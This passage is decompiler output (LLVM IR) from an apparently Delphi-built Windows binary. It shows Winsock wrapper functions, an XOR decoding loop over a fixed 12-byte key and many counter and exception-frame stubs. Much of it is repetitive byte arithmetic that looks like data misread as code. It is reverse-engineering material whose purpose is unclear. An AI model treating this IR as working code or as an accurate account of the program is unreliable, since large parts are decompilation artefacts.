  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !224
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404665() local_unnamed_addr {
dec_label_pc_404665:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40466a() local_unnamed_addr {
dec_label_pc_40466a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_40466c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40466c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404670() local_unnamed_addr {
dec_label_pc_404670:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40467b() local_unnamed_addr {
dec_label_pc_40467b:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = load i8, i8* %5, align 4, !insn.addr !239
  %22 = load i32, i32* %eax, align 4
  %23 = trunc i32 %22 to i8, !insn.addr !239
  %24 = add i8 %21, %23, !insn.addr !239
  %25 = inttoptr i32 %22 to i8*, !insn.addr !239
  store i8 %24, i8* %25, align 1, !insn.addr !239
  %26 = load i8, i8* %5, align 4, !insn.addr !240
  %27 = load i32, i32* %eax, align 4
  %28 = trunc i32 %27 to i8, !insn.addr !240
  %29 = add i8 %26, %28, !insn.addr !240
  %30 = inttoptr i32 %27 to i8*, !insn.addr !240
  store i8 %29, i8* %30, align 1, !insn.addr !240
  %31 = load i8, i8* %5, align 4, !insn.addr !241
  %32 = load i32, i32* %eax, align 4
  %33 = trunc i32 %32 to i8, !insn.addr !241
  %34 = add i8 %31, %33, !insn.addr !241
  %35 = inttoptr i32 %32 to i8*, !insn.addr !241
  store i8 %34, i8* %35, align 1, !insn.addr !241
  %36 = load i8, i8* %5, align 4, !insn.addr !242
  %37 = load i32, i32* %eax, align 4
  %38 = trunc i32 %37 to i8, !insn.addr !242
  %39 = add i8 %36, %38, !insn.addr !242
  %40 = inttoptr i32 %37 to i8*, !insn.addr !242
  store i8 %39, i8* %40, align 1, !insn.addr !242
  %41 = add i32 %0, -117, !insn.addr !243
  %42 = inttoptr i32 %41 to i8*, !insn.addr !243
  %43 = load i8, i8* %42, align 1, !insn.addr !243
  %44 = trunc i32 %2 to i8, !insn.addr !243
  %45 = add i8 %43, %44, !insn.addr !243
  store i8 %45, i8* %42, align 1, !insn.addr !243
  %46 = trunc i32 %2 to i16, !insn.addr !244
  %47 = call i8 @__asm_in(i16 %46), !insn.addr !244
  %48 = add i32 %20, -8, !insn.addr !245
  %49 = inttoptr i32 %48 to i32*, !insn.addr !245
  store i32 4212461, i32* %49, align 4, !insn.addr !245
  %50 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %51 = add i32 %20, -12, !insn.addr !246
  %52 = inttoptr i32 %51 to i32*, !insn.addr !246
  store i32 %50, i32* %52, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !247
  %53 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %54 = add i32 %53, 1, !insn.addr !248
  %55 = icmp eq i32 %54, 0, !insn.addr !248
  store i32 %54, i32* @global_var_409678, align 4, !insn.addr !248
  %56 = icmp eq i1 %55, false, !insn.addr !249
  br i1 %56, label %dec_label_pc_4046df, label %dec_label_pc_4046ad, !insn.addr !249

dec_label_pc_4046ad:                              ; preds = %dec_label_pc_40467b
  %57 = call i32 @"@LStrClr"(), !insn.addr !250
  %58 = call i32 @"@LStrClr"(), !insn.addr !251
  %59 = call i32 @"@LStrClr"(), !insn.addr !252
  %60 = call i32 @"@LStrClr"(), !insn.addr !253
  %61 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046df, !insn.addr !254

dec_label_pc_4046df:                              ; preds = %dec_label_pc_4046ad, %dec_label_pc_40467b
  %62 = add i32 %20, -4, !insn.addr !255
  %63 = inttoptr i32 %62 to i32*, !insn.addr !255
  %64 = load i32, i32* %52, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %64), !insn.addr !257
  store i32 4212468, i32* %63, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046ed() local_unnamed_addr {
dec_label_pc_4046ed:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046f2() local_unnamed_addr {
dec_label_pc_4046f2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046f4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046f8() local_unnamed_addr {
dec_label_pc_4046f8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_404700() local_unnamed_addr {
dec_label_pc_404700:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_40374c(), !insn.addr !266
  %1 = call i32 @function_4034f4(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404735, label %dec_label_pc_40471b, !insn.addr !268

dec_label_pc_40471b:                              ; preds = %dec_label_pc_404700, %dec_label_pc_40471b
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint ([12 x i8]* @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_40471b, label %dec_label_pc_404735, !insn.addr !276

dec_label_pc_404735:                              ; preds = %dec_label_pc_40471b, %dec_label_pc_404700
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_40473c() local_unnamed_addr {
dec_label_pc_40473c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404761() local_unnamed_addr {
dec_label_pc_404761:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_404766() local_unnamed_addr {
dec_label_pc_404766:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_404768(i32 %arg1) local_unnamed_addr {
dec_label_pc_404768:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_40476c() local_unnamed_addr {
dec_label_pc_40476c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404774() local_unnamed_addr {
dec_label_pc_404774:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_404799() local_unnamed_addr {
dec_label_pc_404799:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_40479e() local_unnamed_addr {
dec_label_pc_40479e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_4047a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_4047a4() local_unnamed_addr {
dec_label_pc_4047a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_4047ac(i32 %s) local_unnamed_addr {
dec_label_pc_4047ac:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_4047b4(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047b4:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_4047bc(i16 %hostshort) local_unnamed_addr {
dec_label_pc_4047bc:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_4047c4(%in_addr %in) local_unnamed_addr {
dec_label_pc_4047c4:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047cc(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047cc:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047d4(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047d4:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047dc(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047dc:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047e4(i8* %name) local_unnamed_addr {
dec_label_pc_4047e4:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047ec(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047ec:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047f4(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047f4:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047fc() local_unnamed_addr {
dec_label_pc_4047fc:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_404804() local_unnamed_addr {
dec_label_pc_404804:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_404829() local_unnamed_addr {
dec_label_pc_404829:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_40482e() local_unnamed_addr {
dec_label_pc_40482e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404830(i32 %arg1) local_unnamed_addr {
dec_label_pc_404830:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404834() local_unnamed_addr {
dec_label_pc_404834:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_40483c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40483c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i1 @__decompiler_undefined_function_1()
  br i1 %4, label %dec_label_pc_4048bd, label %dec_label_pc_404847, !insn.addr !322

dec_label_pc_404847:                              ; preds = %dec_label_pc_40483c
  %5 = add i32 %0, 117, !insn.addr !323
  %6 = inttoptr i32 %5 to i32*, !insn.addr !323
  %7 = load i32, i32* %6, align 4, !insn.addr !323
  %8 = sext i32 %7 to i64, !insn.addr !323
  %9 = mul nsw i64 %8, 808467313, !insn.addr !323
  %10 = mul i64 %8, 3472340669219995648
  %11 = sdiv i64 %10, 4294967296, !insn.addr !323
  %12 = icmp eq i64 %9, %11, !insn.addr !323
  %13 = add i32 %2, 110, !insn.addr !324
  %14 = inttoptr i32 %13 to i64*, !insn.addr !324
  %15 = load i64, i64* %14, align 4, !insn.addr !324
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !324
  %17 = load i32, i32* %eax, align 4
  br i1 %12, label %dec_label_pc_40484e, label %dec_label_pc_4048b3, !insn.addr !325

dec_label_pc_40484e:                              ; preds = %dec_label_pc_404847
  %18 = add i32 %17, 61, !insn.addr !326
  %19 = inttoptr i32 %18 to i64*, !insn.addr !326
  %20 = load i64, i64* %19, align 4, !insn.addr !326
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !326
  %22 = inttoptr i32 %13 to i8*, !insn.addr !327
  %23 = load i8, i8* %22, align 1, !insn.addr !327
  %24 = load i32, i32* %eax, align 4, !insn.addr !327
  %25 = udiv i32 %24, 256, !insn.addr !327
  %26 = trunc i32 %25 to i8, !insn.addr !327
  %27 = xor i8 %23, %26, !insn.addr !327
  store i8 %27, i8* %22, align 1, !insn.addr !327
  %28 = mul i32 %21, 2, !insn.addr !328
  %29 = add i32 %28, %3, !insn.addr !328
  %30 = inttoptr i32 %29 to i64*, !insn.addr !328
  %31 = load i64, i64* %30, align 4, !insn.addr !328
  %32 = call i32 @__asm_bound(i64 %31), !insn.addr !328
  %33 = bitcast i32* %eax to i8*
  %34 = load i8, i8* %33, align 4, !insn.addr !329
  %35 = load i32, i32* %eax, align 4
  %36 = trunc i32 %35 to i8, !insn.addr !329
  %37 = add i8 %34, %36, !insn.addr !329
  %38 = inttoptr i32 %35 to i8*, !insn.addr !329
  store i8 %37, i8* %38, align 1, !insn.addr !329
  %39 = load i8, i8* %33, align 4, !insn.addr !330
  %40 = load i32, i32* %eax, align 4
  %41 = trunc i32 %40 to i8, !insn.addr !330
  %42 = add i8 %39, %41, !insn.addr !330
  %43 = inttoptr i32 %40 to i8*, !insn.addr !330
  store i8 %42, i8* %43, align 1, !insn.addr !330
  %44 = load i8, i8* %33, align 4, !insn.addr !331
  %45 = load i32, i32* %eax, align 4
  %46 = trunc i32 %45 to i8, !insn.addr !331
  %47 = add i8 %44, %46, !insn.addr !331
  %48 = inttoptr i32 %45 to i8*, !insn.addr !331
  store i8 %47, i8* %48, align 1, !insn.addr !331
  %49 = load i8, i8* %33, align 4, !insn.addr !332
  %50 = load i32, i32* %eax, align 4
  %51 = trunc i32 %50 to i8, !insn.addr !332
  %52 = add i8 %49, %51, !insn.addr !332
  %53 = inttoptr i32 %50 to i8*, !insn.addr !332
  store i8 %52, i8* %53, align 1, !insn.addr !332
  %54 = load i8, i8* %33, align 4, !insn.addr !333
  %55 = load i32, i32* %eax, align 4
  %56 = trunc i32 %55 to i8, !insn.addr !333
  %57 = add i8 %54, %56, !insn.addr !333
  %58 = inttoptr i32 %55 to i8*, !insn.addr !333
  store i8 %57, i8* %58, align 1, !insn.addr !333
  %59 = load i8, i8* %33, align 4, !insn.addr !334
  %60 = load i32, i32* %eax, align 4
  %61 = trunc i32 %60 to i8, !insn.addr !334
  %62 = add i8 %59, %61, !insn.addr !334
  %63 = inttoptr i32 %60 to i8*, !insn.addr !334
  store i8 %62, i8* %63, align 1, !insn.addr !334
  %64 = load i8, i8* %33, align 4, !insn.addr !335
  %65 = load i32, i32* %eax, align 4
  %66 = trunc i32 %65 to i8, !insn.addr !335
  %67 = add i8 %64, %66, !insn.addr !335
  %68 = inttoptr i32 %65 to i8*, !insn.addr !335
  store i8 %67, i8* %68, align 1, !insn.addr !335
  %69 = load i8, i8* %33, align 4, !insn.addr !336
  %70 = load i32, i32* %eax, align 4
  %71 = trunc i32 %70 to i8, !insn.addr !336
  %72 = add i8 %69, %71, !insn.addr !336
  %73 = inttoptr i32 %70 to i8*, !insn.addr !336
  store i8 %72, i8* %73, align 1, !insn.addr !336
  %74 = load i8, i8* %33, align 4, !insn.addr !337
  %75 = load i32, i32* %eax, align 4
  %76 = trunc i32 %75 to i8, !insn.addr !337
  %77 = add i8 %74, %76, !insn.addr !337
  %78 = inttoptr i32 %75 to i8*, !insn.addr !337
  store i8 %77, i8* %78, align 1, !insn.addr !337
  %79 = load i8, i8* %33, align 4, !insn.addr !338
  %80 = load i32, i32* %eax, align 4
  %81 = trunc i32 %80 to i8, !insn.addr !338
  %82 = add i8 %79, %81, !insn.addr !338
  %83 = inttoptr i32 %80 to i8*, !insn.addr !338
  store i8 %82, i8* %83, align 1, !insn.addr !338
  %84 = load i8, i8* %33, align 4, !insn.addr !339
  %85 = load i32, i32* %eax, align 4
  %86 = trunc i32 %85 to i8, !insn.addr !339
  %87 = add i8 %84, %86, !insn.addr !339
  %88 = inttoptr i32 %85 to i8*, !insn.addr !339
  store i8 %87, i8* %88, align 1, !insn.addr !339
  %89 = load i8, i8* %33, align 4, !insn.addr !340
  %90 = load i32, i32* %eax, align 4
  %91 = trunc i32 %90 to i8, !insn.addr !340
  %92 = add i8 %89, %91, !insn.addr !340
  %93 = inttoptr i32 %90 to i8*, !insn.addr !340
  store i8 %92, i8* %93, align 1, !insn.addr !340
  %94 = load i8, i8* %33, align 4, !insn.addr !341
  %95 = load i32, i32* %eax, align 4
  %96 = trunc i32 %95 to i8, !insn.addr !341
  %97 = add i8 %94, %96, !insn.addr !341
  %98 = inttoptr i32 %95 to i8*, !insn.addr !341
  store i8 %97, i8* %98, align 1, !insn.addr !341
  %99 = load i8, i8* %33, align 4, !insn.addr !342
  %100 = load i32, i32* %eax, align 4
  %101 = trunc i32 %100 to i8, !insn.addr !342
  %102 = add i8 %99, %101, !insn.addr !342
  %103 = inttoptr i32 %100 to i8*, !insn.addr !342
  store i8 %102, i8* %103, align 1, !insn.addr !342
  %104 = load i8, i8* %33, align 4, !insn.addr !343
  %105 = load i32, i32* %eax, align 4
  %106 = trunc i32 %105 to i8, !insn.addr !343
  %107 = add i8 %104, %106, !insn.addr !343
  %108 = inttoptr i32 %105 to i8*, !insn.addr !343
  store i8 %107, i8* %108, align 1, !insn.addr !343
  %109 = load i8, i8* %33, align 4, !insn.addr !344
  %110 = load i32, i32* %eax, align 4
  %111 = trunc i32 %110 to i8, !insn.addr !344
  %112 = add i8 %109, %111, !insn.addr !344
  %113 = inttoptr i32 %110 to i8*, !insn.addr !344
  store i8 %112, i8* %113, align 1, !insn.addr !344
  %114 = load i8, i8* %33, align 4, !insn.addr !345
  %115 = load i32, i32* %eax, align 4
  %116 = trunc i32 %115 to i8, !insn.addr !345
  %117 = add i8 %114, %116, !insn.addr !345
  %118 = inttoptr i32 %115 to i8*, !insn.addr !345
  store i8 %117, i8* %118, align 1, !insn.addr !345
  %119 = add i32 %1, 105, !insn.addr !346
  %120 = inttoptr i32 %119 to i8*, !insn.addr !346
  %121 = load i8, i8* %120, align 1, !insn.addr !346
  %122 = udiv i32 %1, 256, !insn.addr !346
  %123 = trunc i32 %122 to i8, !insn.addr !346
  %124 = add i8 %121, %123, !insn.addr !346
  store i8 %124, i8* %120, align 1, !insn.addr !346
  %125 = load i32, i32* %eax, align 4, !insn.addr !346
  ret i32 %125, !insn.addr !346

dec_label_pc_4048b3:                              ; preds = %dec_label_pc_404847
  %126 = inttoptr i32 %17 to i8*, !insn.addr !347
  %127 = load i8, i8* %126, align 1, !insn.addr !347
  %128 = trunc i32 %17 to i8, !insn.addr !347
  %129 = add i8 %127, %128, !insn.addr !347
  store i8 %129, i8* %126, align 1, !insn.addr !347
  %130 = load i32, i32* %eax, align 4
  %131 = inttoptr i32 %130 to i8*, !insn.addr !348
  %132 = load i8, i8* %131, align 1, !insn.addr !348
  %133 = trunc i32 %130 to i8, !insn.addr !348
  %134 = add i8 %132, %133, !insn.addr !348
  store i8 %134, i8* %131, align 1, !insn.addr !348
  %135 = load i32, i32* %eax, align 4
  %136 = inttoptr i32 %135 to i8*, !insn.addr !349
  %137 = load i8, i8* %136, align 1, !insn.addr !349
  %138 = trunc i32 %135 to i8, !insn.addr !349
  %139 = add i8 %137, %138, !insn.addr !349
  store i8 %139, i8* %136, align 1, !insn.addr !349
  %140 = load i32, i32* %eax, align 4
  %141 = inttoptr i32 %140 to i8*, !insn.addr !350
  %142 = load i8, i8* %141, align 1, !insn.addr !350
  %143 = trunc i32 %140 to i8, !insn.addr !350
  %144 = add i8 %142, %143, !insn.addr !350
  store i8 %144, i8* %141, align 1, !insn.addr !350
  %145 = load i32, i32* %eax, align 4
  %146 = inttoptr i32 %145 to i8*, !insn.addr !351
  %147 = load i8, i8* %146, align 1, !insn.addr !351
  %148 = trunc i32 %145 to i8, !insn.addr !351
  %149 = add i8 %147, %148, !insn.addr !351
  store i8 %149, i8* %146, align 1, !insn.addr !351
  br label %dec_label_pc_4048bd, !insn.addr !351

dec_label_pc_4048bd:                              ; preds = %dec_label_pc_4048b3, %dec_label_pc_40483c
  %150 = load i32, i32* %eax, align 4
  %151 = inttoptr i32 %150 to i8*, !insn.addr !352
  %152 = load i8, i8* %151, align 1, !insn.addr !352
  %153 = trunc i32 %150 to i8, !insn.addr !352
  %154 = add i8 %152, %153, !insn.addr !352
  store i8 %154, i8* %151, align 1, !insn.addr !352
  %155 = load i32, i32* %eax, align 4
  %156 = inttoptr i32 %155 to i8*, !insn.addr !353
  %157 = load i8, i8* %156, align 1, !insn.addr !353
  %158 = trunc i32 %155 to i8, !insn.addr !353
  %159 = add i8 %157, %158, !insn.addr !353
  store i8 %159, i8* %156, align 1, !insn.addr !353
  %160 = load i32, i32* %eax, align 4, !insn.addr !353
  ret i32 %160, !insn.addr !353
}

define i32 @function_4049f9() local_unnamed_addr {
dec_label_pc_4049f9:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !354
  ret i32 %0, !insn.addr !354
}

define i32 @function_4049fe() local_unnamed_addr {
dec_label_pc_4049fe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !355
}

define i32 @function_404a00(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a00:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !356
}

define i32 @function_404a04() local_unnamed_addr {
dec_label_pc_404a04:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409688, align 4, !insn.addr !357
  %2 = add i32 %1, -1, !insn.addr !357
  store i32 %2, i32* @global_var_409688, align 4, !insn.addr !357
  ret i32 %0, !insn.addr !358
}

define i32* @function_404a0c(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_404a0c:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !359
  ret i32* %0, !insn.addr !359
}

define i32 @function_404a12() local_unnamed_addr {
dec_label_pc_404a12:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !360
}

define i32 @function_404a15() local_unnamed_addr {
dec_label_pc_404a15:
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !361
  store i32 %0, i32* %stack_var_-12, align 4, !insn.addr !361
  %1 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !361
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !362
  %2 = load i32, i32* @global_var_40968c, align 4, !insn.addr !363
  %3 = add i32 %2, 1, !insn.addr !363
  store i32 %3, i32* @global_var_40968c, align 4, !insn.addr !363
  %4 = load i32, i32* %stack_var_-12, align 4, !insn.addr !364
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !365
  ret i32 0, !insn.addr !366
}

define i32 @function_404a39() local_unnamed_addr {
dec_label_pc_404a39:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !367
  ret i32 %0, !insn.addr !367
}

define i32 @function_404a3e() local_unnamed_addr {
dec_label_pc_404a3e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !368
}

define i32 @function_404a40(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a40:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !369
}

define i32 @function_404a44() local_unnamed_addr {
